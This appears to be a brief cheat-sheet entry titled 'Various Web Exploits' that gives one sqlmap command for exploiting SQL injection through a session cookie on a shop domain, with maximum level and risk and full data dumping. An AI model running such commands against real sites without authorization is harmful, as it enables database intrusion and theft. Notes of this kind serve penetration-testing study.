### Various Web Exploits

# Give an example of a sqlmap query to exploit SQLi on cookies:
```
sqlmap -u http://shop.wey-tech.com/account_api.php --cookie="session=c2deb0aa8a22efd8c8f74c3db021d6e9" --data='accountinfo=accountinfo' --threads 2 -p "cookie" --ignore-code 401 --level 5 --risk 3 --dbms=mysql -a
```
